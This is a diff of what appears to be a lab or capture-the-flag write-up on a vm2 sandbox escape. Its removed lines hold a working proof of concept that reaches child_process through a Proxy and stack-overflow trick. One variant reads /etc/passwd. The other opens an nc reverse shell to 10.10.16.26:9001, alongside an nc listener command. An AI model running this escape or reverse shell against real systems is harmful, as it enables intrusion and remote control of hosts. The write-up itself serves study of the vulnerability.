@@ -42,30 +42,8 @@ https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
 which allows an attacker to bypass sandbox limitations and execute arbitrary code in the host environment.
 
 I modified the PoC command and tested whether the exploit was working in the expected manner. The command I used, and got the result.
-```
-const {VM} = require("vm2");
-const vm = new VM();
-const code = `
-cmd = 'cat /etc/passwd'
-err = {};
-const handler = {
-    getPrototypeOf(target) {
-        (function stack() {
-            new Error().stack;
-            stack();
-        })();
-    }
-};
-  
-const proxiedErr = new Proxy(err, handler);
-try {
-    throw proxiedErr;
-} catch ({constructor: c}) {
-    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
-}
-`
-console.log(vm.run(code));
-```
+
+![](/assets/img/posts/1-cve.png)
 
 ![](/assets/img/posts/Pasted%20image%2020260820105615.png)
 
@@ -77,31 +55,8 @@ nc -nvlp 9001
 ```
 
 Second, making our reverse shell
-```
-const {VM} = require("vm2");
-const vm = new VM();
 
-const code = `
-cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.26 9001 >/tmp/f'
-err = {};
-const handler = {
-    getPrototypeOf(target) {
-        (function stack() {
-            new Error().stack;
-            stack();
-        })();
-    }
-};
-  
-const proxiedErr = new Proxy(err, handler);
-try {
-    throw proxiedErr;
-} catch ({constructor: c}) {
-    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
-}
-`
-console.log(vm.run(code));
-```
+![](/assets/img/posts/2-cve.png)
 
 
 ![](/assets/img/posts/Pasted%20image%2020260820105222.png)
